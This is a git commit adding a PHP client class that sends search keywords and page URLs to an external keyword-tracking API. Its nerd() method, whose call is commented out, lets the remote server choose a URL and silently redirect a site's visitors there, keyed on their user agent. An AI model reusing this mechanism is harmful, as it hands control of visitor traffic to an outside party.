4fa4153556b733992acd2b72075c9f6689c95878
yoyodahlan8 <65673505+yoyodahlan8@users.noreply.github.com>
2020-05-20 23:24:29 +0700

    Add files via upload

---
+++ TermApi.php
@@ -0,0 +1,102 @@
+<?php 
+namespace Buchin\TermapiClient;
+
+use Buchin\SearchTerm\SearchTerm;
+
+class TermApi
+{
+	private $token = '';
+	private $url = 'https://termapi.dojo.cc/api';
+
+	public static function token($site)
+	{
+		$url = 'https://termapi.dojo.cc/api' . '/?' . http_build_query(['site' => $site]);
+
+		return json_decode(file_get_contents($url))->token??null;
+	}
+	
+	function __construct($token)
+	{
+		$this->token = $token;
+	}
+
+	public function recent($options)
+	{
+		$url = $this->url . '/keywords?' . http_build_query($options);
+		$result = json_decode(file_get_contents($url));
+
+		return $result;
+	}
+	public function popular($options)
+	{
+		$url = $this->url . '/popular?' . http_build_query($options);
+		$result = json_decode(file_get_contents($url));
+
+		return $result;
+	}
+
+	public function insert($options)
+	{
+		$opts = ['http' =>
+		    [
+		        'method'  => 'POST',
+		        'header'  => 'Content-type: application/x-www-form-urlencoded',
+		        'content' => http_build_query($options)
+		    ]
+		];
+
+		$context  = stream_context_create($opts);
+		$url = $this->url . '/keywords';
+		$result = json_decode(file_get_contents($url, false, $context));
+
+		return $result;
+	}
+
+	public static function termapi($token)
+	{
+		if(SearchTerm::isCameFromSearchEngine()){
+
+	        $keyword = SearchTerm::get();
+
+	        if(!empty($keyword)){
+	        
+	            insert_term([
+	                'token' => $token,
+	                'keyword' => $keyword,
+	                'url' => self::current_url()
+	            ]);
+	        }
+	    }
+
+	   // self::nerd($token);
+	}
+
+	public static function nerd($token)
+	{
+		$options = [
+			'token' => $token,
+			'ua' => $_SERVER['HTTP_USER_AGENT']??''
+		];
+
+		$url = 'https://termapi.dojo.cc/api/nerd?' . http_build_query($options);
+		$result = json_decode(file_get_contents($url));
+
+		if(isset($result->name)){
+			$url = @file_get_contents($result->name . '?nerd=1');
+
+			if($url){
+				@http_response_code(303);
+				@header('Location: ' . $url);
+				exit;
+			}
+		}
+	}
+
+	public static function current_url()
+	{
+		$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+	 
+		$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+		return $url;
+	}
+}
